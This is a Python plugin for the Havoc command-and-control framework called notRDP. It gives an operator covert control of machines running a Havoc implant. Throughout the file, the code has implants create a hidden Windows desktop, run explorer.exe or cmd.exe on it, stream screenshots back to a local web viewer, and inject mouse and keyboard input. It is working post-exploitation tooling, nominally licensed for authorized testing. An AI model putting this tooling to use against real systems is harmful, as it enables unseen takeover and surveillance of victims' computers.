"""
notRDP - Hidden Desktop Plugin for Havoc C2

Author:  Dhanush Arvind
License: For authorized security testing and educational use only.
"""

from havoc import Demon, RegisterCommand
from struct import pack, calcsize

import base64
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import webbrowser


__version__ = "1.0.0"
__author__ = "Dhanush Arvind"

DEFAULT_VIEWER_PORT = 4444
DEFAULT_JPEG_QUALITY = 30
DEFAULT_DESKTOP_NAME = "NotRDP"

_bof_dir = None

def _get_bof_dir():
    global _bof_dir
    if _bof_dir is None:
        try:
            _bof_dir = os.path.dirname(os.path.abspath(__file__))
        except NameError:
            # Havoc embedded Python doesn't define __file__
            _bof_dir = os.getcwd()
    return _bof_dir


def set_bof_dir(path):
    """Call set_bof_dir('/path/to/notrdp') if auto-detection picks
    the wrong directory (e.g. Havoc CWD differs from script location)."""
    global _bof_dir
    _bof_dir = path


class Packer:
    def __init__(self):
        self.buffer = b""
        self.size = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addint(self, val):
        self.buffer += pack("<i", val)
        self.size += 4

    def adduint32(self, val):
        self.buffer += pack("<I", val)
        self.size += 4

    def addstr(self, s):
        if s is None:
            s = ""
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addbool(self, b):
        self.buffer += pack("<I", 1 if b else 0)
        self.size += 4


_streaming = {}
_demon_arch = {}
_hidden_desktop = {}
_server_proc = None
_viewer_port = DEFAULT_VIEWER_PORT
_shared_dir = None


def _get_screenshot_bof(arch):
    name = "screenshot.x86.o" if arch == "x86" else "screenshot.x64.o"
    return os.path.join(_get_bof_dir(), name)

def _get_screeninput_bof(arch):
    name = "screeninput.x86.o" if arch == "x86" else "screeninput.x64.o"
    return os.path.join(_get_bof_dir(), name)

def _get_notrdp_bof(arch):
    name = "notrdp_mgr.x86.o" if arch == "x86" else "notrdp_mgr.x64.o"
    return os.path.join(_get_bof_dir(), name)


def _init_shared_dir():
    global _shared_dir
    if _shared_dir is not None:
        return
    _shared_dir = os.path.join(tempfile.gettempdir(), "notrdp")
    os.makedirs(_shared_dir, exist_ok=True)

def _write_frame(demon_id, jpeg_bytes):
    _init_shared_dir()
    frame_path = os.path.join(_shared_dir, demon_id + ".jpg")
    try:
        with open(frame_path, "wb") as f:
            f.write(jpeg_bytes)
    except Exception:
        pass

def _update_demons_list():
    _init_shared_dir()
    demons = []
    all_ids = set(list(_streaming.keys()) + list(_hidden_desktop.keys()))
    for did in all_ids:
        d = {"id": did, "streaming": _streaming.get(did, {}).get("active", False)}
        hd = _hidden_desktop.get(did)
        if hd:
            d["hidden_desktop"] = hd["name"]
            d["desktop_active"] = hd.get("active", False)
        demons.append(d)
    demons_file = os.path.join(_shared_dir, "demons.json")
    try:
        with open(demons_file, "w") as f:
            json.dump(demons, f)
    except Exception:
        pass

def _read_and_clear_input(demon_id):
    _init_shared_dir()
    input_file = os.path.join(_shared_dir, demon_id + "_input.json")
    try:
        with open(input_file, "r") as f:
            commands = json.load(f)
        with open(input_file, "w") as f:
            json.dump([], f)
        return commands
    except (FileNotFoundError, json.JSONDecodeError):
        return []

def _read_and_clear_notrdp_commands(demon_id):
    _init_shared_dir()
    hd_file = os.path.join(_shared_dir, demon_id + "_notrdp.json")
    try:
        with open(hd_file, "r") as f:
            commands = json.load(f)
        with open(hd_file, "w") as f:
            json.dump([], f)
        return commands
    except (FileNotFoundError, json.JSONDecodeError):
        return []


def _debug_log(msg):
    try:
        _init_shared_dir()
        with open(os.path.join(_shared_dir, "debug.log"), "a") as f:
            f.write("%s\n" % msg)
    except Exception:
        pass


def _screenshot_callback(demonID, TaskID, worked, output, error):
    _debug_log("callback: worked=%s output_len=%s error=%s" % (
        worked, len(output) if output else 0, str(error)[:100] if error else "None"))

    if error:
        try:
            demon = Demon(demonID)
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                "Screenshot BOF error: %s" % str(error)[:200])
        except Exception:
            pass

    if worked and output and "SCREENCAP:" in output:
        lines = output.strip().split("\n", 1)
        if len(lines) >= 2:
            b64data = lines[1].strip()
            match = re.match(r"SCREENCAP:(\d+)x(\d+):(\d+)", lines[0])
            if match:
                try:
                    jpeg_bytes = base64.b64decode(b64data)
                    if len(jpeg_bytes) >= 2 and jpeg_bytes[0:2] == b"\xff\xd8":
                        _write_frame(demonID, jpeg_bytes)
                        _debug_log("frame written: %d bytes" % len(jpeg_bytes))
                except Exception as e:
                    _debug_log("decode error: %s" % str(e))

    _process_pending_input(demonID)

    config = _streaming.get(demonID)
    if config and config.get("active"):
        try:
            demon = Demon(demonID)
            packer = Packer()
            packer.adduint32(config.get("quality", DEFAULT_JPEG_QUALITY))
            desktop_name = config.get("desktop_name", "")
            packer.addstr(desktop_name)
            demon.InlineExecuteGetOutput(
                _screenshot_callback, "go",
                config["bof_path"], packer.getbuffer(),
            )
        except Exception:
            config["active"] = False
            _update_demons_list()

    return True


def _input_callback(demonID, TaskID, worked, output, error):
    _process_pending_input(demonID)
    return True


def _notrdp_callback(demonID, TaskID, worked, output, error):
    _debug_log("notrdp_cb: worked=%s output=%s error=%s" % (
        worked, str(output)[:200] if output else "None",
        str(error)[:100] if error else "None"))
    try:
        demon = Demon(demonID)
        if error:
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                "notRDP BOF error: %s" % str(error)[:200])
        if worked and output:
            demon.ConsoleWrite(demon.CONSOLE_TASK,
                "notRDP: %s" % output.strip()[:300])
            if "NOTRDP:CREATED:" in output:
                after = output.split("NOTRDP:CREATED:")[1]
                name = after.split("NOTRDP:")[0].strip()
                if not name:
                    name = DEFAULT_DESKTOP_NAME
                _debug_log("parsed desktop name: '%s'" % name)
                _hidden_desktop[demonID] = {"name": name, "active": True}
                _update_demons_list()
            elif "NOTRDP:CLOSED:" in output:
                _hidden_desktop.pop(demonID, None)
                _update_demons_list()
    except Exception:
        pass
    return True


def _process_pending_input(demon_id):
    commands = _read_and_clear_input(demon_id)
    if not commands:
        return

    arch = _demon_arch.get(demon_id, "x64")
    input_bof = _get_screeninput_bof(arch)

    config = _streaming.get(demon_id, {})
    desktop_name = config.get("desktop_name", "")

    action_map_mouse = {
        "move": 0, "click": 1, "rightclick": 2,
        "dblclick": 3, "down": 4, "up": 5,
        "scroll": 6, "rightdown": 7, "rightup": 8,
    }
    action_map_kbd = {"press": 0, "down": 1, "up": 2}

    notrdp_commands = [c for c in commands if c.get("input_type") == "notrdp"]
    notrdp_commands += _read_and_clear_notrdp_commands(demon_id)
    input_commands = [c for c in commands if c.get("input_type") != "notrdp"]

    for cmd in notrdp_commands:
        try:
            notrdp_bof = _get_notrdp_bof(arch)
            if not os.path.exists(notrdp_bof):
                continue
            hd_action = cmd.get("action", "run")
            packer = Packer()
            if hd_action == "create":
                packer.addint(0)
                packer.addstr(cmd.get("desktop_name", DEFAULT_DESKTOP_NAME))
                packer.addstr(cmd.get("cmd", "explorer.exe"))
            elif hd_action == "run":
                packer.addint(1)
                hd = _hidden_desktop.get(demon_id)
                packer.addstr(hd["name"] if hd else DEFAULT_DESKTOP_NAME)
                packer.addstr(cmd.get("cmd", "cmd.exe"))
            elif hd_action == "close":
                packer.addint(2)
                hd = _hidden_desktop.get(demon_id)
                packer.addstr(hd["name"] if hd else DEFAULT_DESKTOP_NAME)
                packer.addstr("")
            demon = Demon(demon_id)
            demon.InlineExecuteGetOutput(
                _notrdp_callback, "go", notrdp_bof, packer.getbuffer(),
            )
        except Exception:
            pass

    for cmd in input_commands:
        try:
            itype = 0 if cmd.get("input_type", "mouse") == "mouse" else 1
            if itype == 0:
                action = action_map_mouse.get(cmd.get("action", "click"), 1)
            else:
                action = action_map_kbd.get(cmd.get("action", "press"), 0)

            packer = Packer()
            packer.addint(itype)
            packer.addint(action)
            packer.addint(int(cmd.get("x", 0)))
            packer.addint(int(cmd.get("y", 0)))
            packer.addint(int(cmd.get("keycode", 0)))
            packer.addint(int(cmd.get("flags", 0)))
            packer.addstr(desktop_name)

            demon = Demon(demon_id)
            demon.InlineExecuteGetOutput(
                _input_callback, "go", input_bof, packer.getbuffer(),
            )
        except Exception:
            pass


def _is_server_running():
    global _server_proc
    if _server_proc is not None:
        if _server_proc.poll() is None:
            return True
        _server_proc = None
    _init_shared_dir()
    pid_file = os.path.join(_shared_dir, "server.pid")
    try:
        with open(pid_file, "r") as f:
            pid = int(f.read().strip())
        os.kill(pid, 0)
        return True
    except (FileNotFoundError, ValueError, OSError):
        return False


def _start_viewer_server(port=None):
    global _server_proc, _viewer_port
    if port is not None and port != _viewer_port:
        _stop_viewer_server()
        _viewer_port = port
    elif port is not None:
        _viewer_port = port

    if _is_server_running():
        return True

    _init_shared_dir()

    server_script = os.path.join(_get_bof_dir(), "_viewer_server.py")
    viewer_html = os.path.join(_get_bof_dir(), "viewer.html")

    if not os.path.exists(server_script):
        return False

    shutil.copy2(server_script, _shared_dir)
    shutil.copy2(viewer_html, _shared_dir)

    logo_src = os.path.join(_get_bof_dir(), "notRDP logo@2x.png")
    if os.path.exists(logo_src):
        shutil.copy2(logo_src, os.path.join(_shared_dir, "bg.png"))

    server_path = os.path.join(_shared_dir, "_viewer_server.py")
    viewer_path = os.path.join(_shared_dir, "viewer.html")

    try:
        _server_proc = subprocess.Popen(
            [sys.executable, server_path, str(_viewer_port),
             _shared_dir, viewer_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        return True
    except Exception:
        _server_proc = None
        return False


def _stop_viewer_server():
    global _server_proc
    if _server_proc is not None:
        try:
            _server_proc.terminate()
            _server_proc.wait(timeout=3)
        except Exception:
            try:
                _server_proc.kill()
            except Exception:
                pass
        _server_proc = None

    _init_shared_dir()
    pid_file = os.path.join(_shared_dir, "server.pid")
    try:
        with open(pid_file, "r") as f:
            pid = int(f.read().strip())
        os.kill(pid, signal.SIGTERM)
    except (FileNotFoundError, ValueError, OSError):
        pass
    try:
        os.remove(pid_file)
    except OSError:
        pass


def _notrdp_created_callback(demonID, TaskID, worked, output, error):
    _notrdp_callback(demonID, TaskID, worked, output, error)

    hd = _hidden_desktop.get(demonID)
    if not hd:
        return True

    desktop_name = hd["name"]
    arch = _demon_arch.get(demonID, "x64")
    screenshot_bof = _get_screenshot_bof(arch)

    if not os.path.exists(screenshot_bof):
        return True

    quality = hd.get("quality", DEFAULT_JPEG_QUALITY)

    _streaming[demonID] = {
        "quality": quality,
        "bof_path": screenshot_bof,
        "active": True,
        "desktop_name": desktop_name,
    }
    _update_demons_list()

    packer = Packer()
    packer.adduint32(quality)
    packer.addstr(desktop_name)

    demon = Demon(demonID)
    demon.InlineExecuteGetOutput(
        _screenshot_callback, "go", screenshot_bof, packer.getbuffer(),
    )

    return True


def on_notrdp(demonID, *args):
    demon = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        "Starting notRDP session...")

    arch = getattr(demon, "ProcessArch", "x64")
    notrdp_bof = _get_notrdp_bof(arch)
    screenshot_bof = _get_screenshot_bof(arch)

    if not os.path.exists(notrdp_bof):
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "BOF not found: %s" % os.path.basename(notrdp_bof))
        return TaskID
    if not os.path.exists(screenshot_bof):
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "BOF not found: %s" % os.path.basename(screenshot_bof))
        return TaskID

    if demonID in _streaming and _streaming[demonID].get("active"):
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Already running. Use notrdp-close first.")
        return TaskID

    port = DEFAULT_VIEWER_PORT
    quality = DEFAULT_JPEG_QUALITY
    params = [a for a in args if a]

    if len(params) >= 1:
        try:
            port = int(params[0])
            if port < 1 or port > 65535:
                raise ValueError
        except ValueError:
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                "Invalid port: %s (must be 1-65535)" % params[0])
            return TaskID

    if len(params) >= 2:
        try:
            quality = int(params[1])
            quality = max(1, min(100, quality))
        except ValueError:
            pass

    if not _start_viewer_server(port):
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Failed to start viewer server.")
        return TaskID

    _demon_arch[demonID] = arch
    desktop_name = DEFAULT_DESKTOP_NAME

    _hidden_desktop[demonID] = {
        "name": desktop_name, "active": True, "quality": quality,
    }

    packer = Packer()
    packer.addint(0)
    packer.addstr(desktop_name)
    packer.addstr("")

    demon.InlineExecuteGetOutput(
        _notrdp_created_callback, "go", notrdp_bof, packer.getbuffer(),
    )

    viewer_url = "http://127.0.0.1:%d" % _viewer_port
    demon.ConsoleWrite(demon.CONSOLE_TASK,
        "notRDP session starting (%s, quality=%d)\n"
        "    Desktop:  %s\n"
        "    Viewer:   %s\n"
        "    Close:    notrdp-close"
        % (arch, quality, desktop_name, viewer_url))

    try:
        webbrowser.open(viewer_url)
    except Exception:
        pass

    return TaskID


def on_notrdp_close(demonID, *args):
    demon = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        "Closing notRDP session...")

    config = _streaming.get(demonID)
    if config and config.get("active"):
        config["active"] = False
        _update_demons_list()
        _stop_viewer_server()

    arch = getattr(demon, "ProcessArch", "x64")
    notrdp_bof = _get_notrdp_bof(arch)

    if not os.path.exists(notrdp_bof):
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "BOF not found: %s" % os.path.basename(notrdp_bof))
        return TaskID

    _demon_arch[demonID] = arch
    hd = _hidden_desktop.get(demonID)
    desktop_name = hd["name"] if hd else DEFAULT_DESKTOP_NAME

    packer = Packer()
    packer.addint(2)
    packer.addstr(desktop_name)
    packer.addstr("")

    demon.InlineExecuteGetOutput(
        _notrdp_callback, "go", notrdp_bof, packer.getbuffer(),
    )

    demon.ConsoleWrite(demon.CONSOLE_TASK,
        "Closing notRDP desktop '%s'" % desktop_name)

    return TaskID


RegisterCommand(
    on_notrdp, "", "notrdp",
    "Start a notRDP hidden desktop session",
    0, "[port] [quality]", "notrdp 4444 50",
)

RegisterCommand(
    on_notrdp_close, "", "notrdp-close",
    "Close the notRDP session",
    0, "", "",
)

try:
    import havocui
    havocui.messagebox(
        "notRDP v%s" % __version__,
        "Author: %s\n\n"
        "Commands:\n"
        "  notrdp [port] [quality]  - Start hidden desktop session\n"
        "  notrdp-close             - Close session\n\n"
        "Viewer opens at http://127.0.0.1:4444"
        % (__author__,),
    )
except Exception:
    pass
